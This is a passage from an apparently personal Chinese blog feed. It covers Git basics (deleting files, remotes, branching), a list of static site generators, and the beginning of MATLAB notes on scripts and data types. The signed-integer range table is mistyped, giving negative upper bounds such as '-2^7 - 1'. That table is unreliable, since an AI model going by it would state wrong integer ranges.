删除文件"></a>8. 删除文件</h3><p>工作区删除：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">rm test.txt<br></code></pre></div></td></tr></table></figure><p>当工作区删除了文件后，工作区和版本库就不一致了，就有两种情况：如果你确定要从版本库中删除文件，使用：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git rm test.txt<br></code></pre></div></td></tr></table></figure><p>如果是误删，则需要恢复，则用：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git checkout -- test.txt<br></code></pre></div></td></tr></table></figure><p>这个其实就是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以”还原“。需要注意的是，如果是从来没有被添加到版本库，而在工作区就被删除的文件，是无法恢复的！</p><h2 id="9-GitHub联系"><a href="#9-GitHub联系" class="headerlink" title="9.GitHub联系"></a>9.GitHub联系</h2><h3 id="9-1-添加远程仓库"><a href="#9-1-添加远程仓库" class="headerlink" title="9.1 添加远程仓库"></a>9.1 添加远程仓库</h3><p>需要先在 GitHub 上建一个远程仓库。这里以 learngit 远程仓库为例，根据 GitHub 的提示，在本地的仓库下运行：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git remote add origin git@github.com:loong/learngit.git<br></code></pre></div></td></tr></table></figure><p><strong>注意：</strong>需要把上面的 loong 替换成你自己的GitHub账户名，否则，你在本地关联的就是我的远程库，关联没有问题，但是你以后推送是推不上去的，因为你的SSH Key公钥不在我的账户列表中。</p><p>添加后，远程库的名字就是 origin，这是Git默认的叫法，也可以改成别的。下一步，就可以把本地库的所有内容推送到远程库上：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git push -u origin master<br></code></pre></div></td></tr></table></figure><p>把本地库的内容推送到远程，用 git push 命令，实际上是把当前分支master推送到远程。由于远程库是空的，我们第一次推送 master 分支时，加上了 -u 参数，Git不但会把本地的 master 分支内容推送的远程新的 master 分支，还会把本地的 master 分支和远程的 master 分支关联起来，在以后的推送或者拉取时就可以简化命令。推送成功后，可以看到在 GitHub 页面中看到远程库的内容已经和本地一模一样。</p><p>以后只要在本地作了提交，就可以通过命令：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git push origin master<br></code></pre></div></td></tr></table></figure><p>把本地 master 分支的最新修改推送至GitHub。</p><p>当第一次使用Git的clone或者push命令连接GitHub时，会得到一个警告：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">The authenticity of host <span class="hljs-string">&#x27;github.com (xx.xx.xx.xx)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">RSA key fingerprint is xx.xx.xx.xx.xx.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no)?</span><br></code></pre></div></td></tr></table></figure><p>这是因为Git使用SSH连接，而SSH连接在第一次验证GitHub服务器的Key时，需要你确认GitHub的Key的指纹信息是否真的来自GitHub的服务器，输入yes回车即可。</p><p>Git会输出一个警告，告诉你已经把GitHub的Key添加到本机的一个信任列表里了：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">Warning: Permanently added <span class="hljs-string">&#x27;github.com&#x27;</span> (RSA) to the list of known hosts.<br></code></pre></div></td></tr></table></figure><p>这个警告只会出现一次，后面的操作就不会有任何警告了。</p><h3 id="9-2-删除远程库"><a href="#9-2-删除远程库" class="headerlink" title="9.2 删除远程库"></a>9.2 删除远程库</h3><p>如果添加的时候地址写错了，或者就是想删除远程库，可以用 git remote rm &lt;name&gt; 命令。使用前，建议先用 git remote -v 查看远程库信息。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git remote -v<br></code></pre></div></td></tr></table></figure><p>然后，根据名字删除，比如删除 origin：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git remote rm origin<br></code></pre></div></td></tr></table></figure><p>此处的“删除”其实是解除了本地和远程的绑定关系，并不是物理上删除了远程库。远程库本身并没有任何改动。要真正删除远程库，需要登录到GitHub，在后台页面找到删除按钮再删除。</p><h3 id="9-3-克隆远程仓库"><a href="#9-3-克隆远程仓库" class="headerlink" title="9.3 克隆远程仓库"></a>9.3 克隆远程仓库</h3><p>找一个远程仓库，用 git clone 命令在本地克隆一个：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> URL<br></code></pre></div></td></tr></table></figure><p>其中 URL 是远程仓库的地址，例如：<a href="https://github.com/loong/dragon.git">https://github.com/loong/dragon.git</a> 这种形式的链接地址。注意：不是网址！！！</p><h2 id="10-Git分支"><a href="#10-Git分支" class="headerlink" title="10.Git分支"></a>10.Git分支</h2><p>每次提交，Git都把它们串成一条时间线，这条时间线就是一个分支。截止到目前，只有一条时间线，在Git里，这个分支叫主分支，即 master 分支。HEAD 严格来说不是指向提交，而是指向 master，master 才是指向提交的，所以，HEAD 指向的就是当前分支。</p><blockquote><p>一开始的时候，master分支是一条线，Git用master指向最新的提交，再用HEAD指向master，就能确定当前分支，以及当前分支的提交点：</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210602091951658.png"></p><blockquote><p>每次提交，master 分支都会向前移动一步，这样，随着你不断提交，master 分支的线也越来越长。<br>当我们创建新的分支，例如 dev 时，Git 新建了一个指针叫 dev，指向 master 相同的提交，再把 HEAD 指向dev，就表示当前分支在 dev 上：</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210602092008679.png"></p><blockquote><p>Git 创建一个分支很快，因为除了增加一个dev指针，改改 HEAD 的指向，工作区的文件都没有任何变化！不过，从现在开始，对工作区的修改和提交就是针对 dev 分支了，比如新提交一次后，dev 指针往前移动一步，而 master 指针不变：</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210602092026712.png"></p><blockquote><p>假如我们在 dev 上的工作完成了，就可以把 dev 合并到 master 上。Git 怎么合并呢？最简单的方法，就是直接把 master 指向 dev 的当前提交，就完成了合并：</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210602092042303.png"></p><blockquote><p>所以Git合并分支也很快！就改改指针，工作区内容也不变！<br>合并完分支后，甚至可以删除 dev 分支。删除 dev 分支就是把 dev 指针给删掉，删掉后，我们就剩下了一条 master 分支：</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20210602092057598.png"></p><h3 id="10-1-创建分支"><a href="#10-1-创建分支" class="headerlink" title="10.1 创建分支"></a>10.1 创建分支</h3><blockquote><ol><li>创建并切换分支，如：创建 dev 分支</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git checkout -b dev<br></code></pre></div></td></tr></table></figure><p>git checkout 命令加上 -b 参数表示创建并切换，相当于以下两条命令：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git branch dev<br>git checkout dev <span class="hljs-comment"># 表示切换分支</span><br></code></pre></div></td></tr></table></figure><h3 id="10-2-查看分支"><a href="#10-2-查看分支" class="headerlink" title="10.2 查看分支"></a>10.2 查看分支</h3><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git branch<br></code></pre></div></td></tr></table></figure><p>git branch 命令会列出所有分支，当前分支前面会标一个星号（*）。然后，就可以在当前分支上正常操作了。</p><h3 id="10-3-切换分支"><a href="#10-3-切换分支" class="headerlink" title="10.3 切换分支"></a>10.3 切换分支</h3><p>切换回 master 分支。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git checkout master<br></code></pre></div></td></tr></table></figure><h3 id="10-4-合并分支"><a href="#10-4-合并分支" class="headerlink" title="10.4 合并分支"></a>10.4 合并分支</h3><p>现在在 master 分支，把dev分支的工作成果合并到master分支上：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git merge dev<br></code></pre></div></td></tr></table></figure><p>git merge 命令用于合并指定分支到当前分支。</p><h3 id="10-5-删除分支"><a href="#10-5-删除分支" class="headerlink" title="10.5 删除分支"></a>10.5 删除分支</h3><p>删除分支 dev 。</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git branch -d dev<br></code></pre></div></td></tr></table></figure><p>所以在使用分支完成某个任务，合并后再删掉分支，这和直接在 master 分支上工作效果是一样的，但过程更安全。</p><h3 id="10-6-Switch"><a href="#10-6-Switch" class="headerlink" title="10.6 Switch"></a>10.6 Switch</h3><p>切换分支时使用到了 git checkout &lt;branch&gt;，而撤销修改则是 git checkout – &lt;file&gt;，同一个命令，有两种作用，有点令人迷惑。因此，最新版本的Git提供了新的 git switch 命令来切换分支。<br>创建并切换到新的 dev 分支：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git switch -c dev<br></code></pre></div></td></tr></table></figure><p>直接切换到已有的 master 分支：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">git switch master<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>静态博客网站生成工具</title>
    <link href="/2021/06/01/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/"/>
    <url>/2021/06/01/%E5%AE%9E%E7%94%A8%E5%B0%8F%E6%8A%80%E8%83%BD/%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E7%BD%91%E7%AB%99%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/</url>
    
    <content type="html"><![CDATA[<p>静态网站非常适合专注于内容的网站，例如，博客。静态网站占用的系统资源少，不经过php解析器，不用数据库，速度比动态网站快；免疫很多web攻击方式。服务器端配置简单，只需要一个web server（apache、nginx）。</p><hr><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-Jekyll"><a href="#1-Jekyll" class="headerlink" title="1.Jekyll"></a>1.Jekyll</h2><p>官网：<a href="https://jekyllrb.com/">https://jekyllrb.com/</a></p><h2 id="2-Octopress"><a href="#2-Octopress" class="headerlink" title="2.Octopress"></a>2.Octopress</h2><p>官网：<a href="http://octopress.org/">http://octopress.org/</a></p><h2 id="3-Hexo"><a href="#3-Hexo" class="headerlink" title="3.Hexo"></a>3.Hexo</h2><p>官网：<a href="https://hexo.io/">https://hexo.io/</a></p><h2 id="4-Hugo"><a href="#4-Hugo" class="headerlink" title="4.Hugo"></a>4.Hugo</h2><p>官网：<a href="https://gohugo.io/">https://gohugo.io/</a></p><h2 id="5-Pelican"><a href="#5-Pelican" class="headerlink" title="5.Pelican"></a>5.Pelican</h2><p>官网：<a href="https://blog.getpelican.com/">https://blog.getpelican.com/</a></p><h2 id="6-Middleman"><a href="#6-Middleman" class="headerlink" title="6.Middleman"></a>6.Middleman</h2><p>官网：<a href="https://middlemanapp.com/">https://middlemanapp.com/</a></p><h2 id="7-Metalsmith"><a href="#7-Metalsmith" class="headerlink" title="7.Metalsmith"></a>7.Metalsmith</h2><p>官网：<a href="https://metalsmith.io/">https://metalsmith.io/</a></p><h2 id="8-Wintersmith"><a href="#8-Wintersmith" class="headerlink" title="8.Wintersmith"></a>8.Wintersmith</h2><p>官网：<a href="http://wintersmith.io/">http://wintersmith.io/</a></p><h2 id="9-Cactus"><a href="#9-Cactus" class="headerlink" title="9.Cactus"></a>9.Cactus</h2><p>官网：<a href="https://github.com/eudicots/Cactus">https://github.com/eudicots/Cactus</a></p><h2 id="10-HubPress"><a href="#10-HubPress" class="headerlink" title="10.HubPress"></a>10.HubPress</h2><p>官网：<a href="http://hubpress.io/">http://hubpress.io/</a></p><h2 id="11-WordPress"><a href="#11-WordPress" class="headerlink" title="11.WordPress"></a>11.WordPress</h2><p>官网：<a href="https://wordpress.org/">https://wordpress.org/</a></p><h2 id="12-VuePress"><a href="#12-VuePress" class="headerlink" title="12.VuePress"></a>12.VuePress</h2><p>官网：<a href="https://vuepress.vuejs.org/zh/">https://vuepress.vuejs.org/zh/</a></p><h2 id="13-Halo"><a href="#13-Halo" class="headerlink" title="13.Halo"></a>13.Halo</h2><p>官网：<a href="https://halo.run/">https://halo.run/</a></p>]]></content>
    
    
    <categories>
      
      <category>实用小技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>数学建模-Matlab学习笔记（四）</title>
    <link href="/2021/05/29/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <url>/2021/05/29/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-Matlab%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E5%9B%9B%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>MATLAB（矩阵实验室）是第四代高层次的编程语言和交互式环境数值计算，可视化和编程。由美国MathWorks公司开发的一种编程语言。用于算法开发、数据可视化、数据分析以及数值计算的高级技术计算语言和交互式环境，主要包括MATLAB和Simulink两大部分。拥有众多的内置命令和数学函数，可以帮助您在数学计算，绘图和执行数值计算方法。 </p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-MATLAT-的M文件"><a href="#1-MATLAT-的M文件" class="headerlink" title="1.MATLAT 的M文件"></a>1.MATLAT 的M文件</h2><p>MATLAB允许写两个程序文件：一是脚本、二是函数。</p><ul><li><p>脚本： 脚本文件 .m 扩展程序文件。在这些文件中写的一系列命令，想一起执行。脚本不接受输入和不返回任何输出。他们在工作区中的数据操作。</p></li><li><p>函数：函数文件 .m 扩展程序文件。函数可以接受输入和返回输出。内部变量是本地的函数。</p></li></ul><p>.m 文件不一定要使用 MATLAB 编辑器创建，其他任何的文本编辑器也是可以的。MATLAB 命令和函数调用的脚本文件包含多个连续的行。可以运行一个脚本，在命令行中键入其名称。</p><h3 id="1-1-脚本"><a href="#1-1-脚本" class="headerlink" title="1.1 脚本"></a>1.1 脚本</h3><h4 id="1-1-1-创建并运行脚本文件"><a href="#1-1-1-创建并运行脚本文件" class="headerlink" title="1.1.1 创建并运行脚本文件"></a>1.1.1 创建并运行脚本文件</h4><p>创建脚本文件，需要使用文本编辑器。MATLAB 编辑器，可使用两个方法：使用命令提示符、使用IDE。如果是在命令提示符下使用，键入编辑。这将打开编辑器。可以直接键入编辑，然后再文件名（ .m 扩展程序文件名）。</p><h5 id="1-1-1-1-命令提示符"><a href="#1-1-1-1-命令提示符" class="headerlink" title="1.1.1.1 命令提示符"></a>1.1.1.1 命令提示符</h5><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">edit <br>Or<br>edit &lt;filename&gt;<br></code></pre></div></td></tr></table></figure><p>这将在默认情况下，MATLAB 目录中创建文件。如果想存储在一个特定的文件夹中的所有程序文件，则一定要提供整个路径。</p><p>示例：创建一个文件夹名为 progs。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">mkdir progs    <span class="hljs-comment">% 在默认目录下创建目录 progs</span><br>chdir progs    <span class="hljs-comment">% 将当前目录更改为 progs</span><br>edit  prog1.m  <span class="hljs-comment">% 创建一个名为 prog1.m 的 m 文件 </span><br></code></pre></div></td></tr></table></figure><p>如果首次创建的文件，MATLAB 会提示您进行确认。单击“Yes”。</p><h5 id="1-1-1-2-IDE"><a href="#1-1-1-2-IDE" class="headerlink" title="1.1.1.2 IDE"></a>1.1.1.2 IDE</h5><p>选择 NEW -&gt; Script。这也打开编辑器，并创建一个文件名为命名。输入代码后可以命名并保存文件。创建和保存文件后，可以运行在两个方面：编辑器窗口中单击“Run”按钮、只要在命令提示符下键入文件名（不含扩展名）即可，如：&gt;&gt; prog1。</p><h2 id="2-MATLAB-数据类型"><a href="#2-MATLAB-数据类型" class="headerlink" title="2.MATLAB 数据类型"></a>2.MATLAB 数据类型</h2><p>默认情况下，MATLAB 存储所有数值变量为双精度浮点值。其他数据类型存储文本，整数或单精度值或单个变量中相关数据的组合。MATLAB不需要任何类型声明或维度语句。当MATLAB遇到新的变量名称时，它将创建变量并分配适当的内存空间。如果变量已经存在，则MATLAB将使用新内容替换原始内容，并在必要时分配新的存储空间。</p><p>MATLAB提供15种基本数据类型，分别是8种整型数据、单精度浮点型、双精度浮点型、逻辑型、字符串型、单元数组、结构体类型和函数句柄。每种数据类型存储矩阵或数组形式的数据。矩阵或数组的最小值是0到0，并且是可以到任何大小的矩阵或数组。如表：</p><table><thead><tr><th align="center">数据类型</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center"><code>int8</code></td><td align="center"><code>8</code>位有符号整数</td></tr><tr><td align="center"><code>uint8</code></td><td align="center"><code>8</code>位无符号整数</td></tr><tr><td align="center"><code>int16</code></td><td align="center"><code>16</code>位有符号整数</td></tr><tr><td align="center"><code>uint16</code></td><td align="center"><code>16</code>位无符号整数</td></tr><tr><td align="center"><code>int32</code></td><td align="center"><code>32</code>位有符号整数</td></tr><tr><td align="center"><code>uint32</code></td><td align="center"><code>32</code>位无符号整数</td></tr><tr><td align="center"><code>int64</code></td><td align="center"><code>64</code>位有符号整数</td></tr><tr><td align="center"><code>uint64</code></td><td align="center"><code>64</code>位无符号整数</td></tr><tr><td align="center"><code>single</code></td><td align="center">单精度数值数据</td></tr><tr><td align="center"><code>double</code></td><td align="center">双精度数值数据</td></tr><tr><td align="center"><code>logical</code></td><td align="center">逻辑值为<code>1</code>或<code>0</code>，分别代表<code>true</code>和<code>false</code></td></tr><tr><td align="center"><code>char</code></td><td align="center">字符数据(字符串作为字符向量存储)</td></tr><tr><td align="center">单元格阵列</td><td align="center">索引单元阵列，每个都能够存储不同维数和数据类型的数组</td></tr><tr><td align="center">结构体</td><td align="center">C型结构，每个结构具有能够存储不同维数和数据类型的数组的命名字段</td></tr><tr><td align="center">函数处理</td><td align="center">指向一个函数的指针</td></tr><tr><td align="center">用户类</td><td align="center">用户定义的类构造的对象</td></tr><tr><td align="center">Java类</td><td align="center">从Java类构造的对象</td></tr></tbody></table><p>示例：创建脚本文件(datatype1.m)</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">str = <span class="hljs-string">&#x27;Hello World!&#x27;</span><br>n = <span class="hljs-number">2345</span><br>d = double(n)<br>un = uint32(<span class="hljs-number">789.50</span>)<br>rn = <span class="hljs-number">5678.92347</span><br>c = int32(rn)<br></code></pre></div></td></tr></table></figure><p>输出结果：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">Trial&gt;&gt; datatype1<br><br>str =<br><br>    <span class="hljs-string">&#x27;Hello World!&#x27;</span><br><br><br>n =<br><br>        <span class="hljs-number">2345</span><br><br><br>d =<br><br>        <span class="hljs-number">2345</span><br><br><br>un =<br><br>  uint32<br><br>   <span class="hljs-number">790</span><br><br><br>rn =<br><br>   <span class="hljs-number">5.6789e+03</span><br><br><br>c =<br><br>  int32<br><br>   <span class="hljs-number">5679</span><br></code></pre></div></td></tr></table></figure><h3 id="2-1-整数类型"><a href="#2-1-整数类型" class="headerlink" title="2.1 整数类型"></a>2.1 整数类型</h3><p>MATLAB 中有 8 种类型的整数，其中包括 4 种有符号整数和 4 种无符号整数：有符号整数能够表示负整数和正整数，而无符号整数类型只能表示正整数和 0。MATLAB 支持 1、2、4 和 8 字节的有符号整数和无符号整数。<br>八种数据类型的名称、表示方法和类型转换函数。</p><table><thead><tr><th align="center">数据类型</th><th align="center">取值范围</th><th align="center">转换函数</th></tr></thead><tbody><tr><td align="center">有符号<code>8</code>位整数</td><td align="center">-2<sup>7</sup> ~ -2<sup>7</sup> - 1</td><td align="center"><code>int8()</code></td></tr><tr><td align="center">有符号 <code>16</code> 位整数</td><td align="center">-2<sup>15</sup> ~ -2<sup>15</sup> - 1</td><td align="center"><code>int16()</code></td></tr><tr><td align="center">有符号 <code>32</code> 位整数</td><td align="center">-2<sup>31</sup> ~ -2<sup>31</sup> - 1</td><td align="center"><code>int32()</code></td></tr><tr><td align="center">有符号 <code>64</code> 位整数</td><td align="center">-2<sup>63</sup> ~ -2<sup>63</sup> - 1</td><td align="center"><code>int64()</code></td></tr><tr><td align="center">无符号 <code>8</code> 位整数</td><td align="center">0 ~ 2<sup>8</sup> - 1</td><td align="center"><code>uint8()</code></td></tr><tr><td align="center">无符号 <code>16</code> 位整数</td><td align="center">0 ~ 2<sup>16</sup> - 1</td><td align="center"><code>uint16()</code></td></tr><tr><td align="center">无符号 <code>32</code> 位整数</td><td align="center">0 ~ 2<sup>32</sup> - 1</td><td align="center"><code>uint32()</code></td></tr><tr><td align="center">无符号 <code>64</code> 位整数</td><td align="center">0 ~ 2<sup>64</sup> - 1</td><td align="center"><code>uint64()</code></td></tr></tbody></table><p>应用时要尽可能用字节数少的数据类型表示数据，这样可以节约存储空间和提高运算速度。</p><h4 id="2-1-1-创建整数类型"><a href="#2-1-1-创建整数类型" class="headerlink" title="2.1.1 创建整数类型"></a>2.1.1 创建整数类型</h4><p>MATLAB 存储数值数据的默认类型是双精度浮点数，要存储为整数类型的数据，必须使用上表中的转换函数。</p><blockquote><ol><li>创建一个有符号的 16 位整数。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">x = int16(<span class="hljs-number">32501</span>);<br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>转换函数将其他数据类型转换为整型。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">str = <span class="hljs-string">&#x27;Hello!&#x27;</span><br>int8(str)<br></code></pre></div></td></tr></table></figure><p>结果将把 str 字符串里面的每一个字符（包括中间的空格）转换为其 ASCII 码。<br>输出结果：</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab"><span class="hljs-built_in">ans</span> = <br>    <span class="hljs-number">1</span> x <span class="hljs-number">6</span> int8 行矢量<br>    <span class="hljs-number">72</span> <span class="hljs-number">101</span> <span class="hljs-number">108</span> <span class="hljs-number">108</span> <span class="hljs-number">111</span> <span class="hljs-number">33</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>使用 whos() 函数可显示由一个变量表示的数组的维数、字节计数和数据类型。</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">whos x<br><span class="hljs-comment">%输出结果</span><br>Name Size Bytes Class Attributes<br>x <span class="hljs-number">1</span>x1 <span class="hljs-number">2</span> int16<br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>使用 class() 函数可以知道数据类型并且指定输出</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">xType = class(x)<br><span class="hljs-comment">%输出结果</span><br>xType = <br>    int16<br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>使用 isinteger() 函数可以验证变量是否为整数</li></ol></blockquote><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">isinteger(x)<br><span class="hljs-comment">%输出结果</span><br><span class="hljs-built_in">ans</span> = <br>    logical<br>    <span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure><p>示例：基于相同整数数据类型之间的数学运算。</p><figure class="highlight matlab"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs matlab">&gt;&gt; k=int8(<span class="hljs-number">1</span>:<span class="hljs-number">7</span>)  <span class="hljs-comment">%创建一组整数</span><br>k =<br>   <span class="hljs-number">1</span>   <span class="hljs-number">2</span>   <span class="hljs-number">3</span>   <span class="hljs-number">4</span>   <span class="hljs-number">5</span>   <span class="hljs-number">6</span>   <span class="hljs-number">7</span><br><br>&gt;&gt; m=int8(randperm(<span class="hljs-number">7</span>))  <span class="hljs-comment">%创建一组随机的整数</span><br>m =<br>   <span class="hljs-number">6</span>   <span class="hljs-number">3</span>   <span class="hljs-number">7</span>   <span class="hljs-number">5</span>   <span class="hljs-number">1</span>   <span class="hljs-number">2</span>   <span class="hljs-number">4</span><br><br>&gt;&gt; k+m  <span class="hljs-comment">%加法</span><br><span class="hljs-built_in">ans</span> =<br>    <span class="hljs-number">7</span>    <span 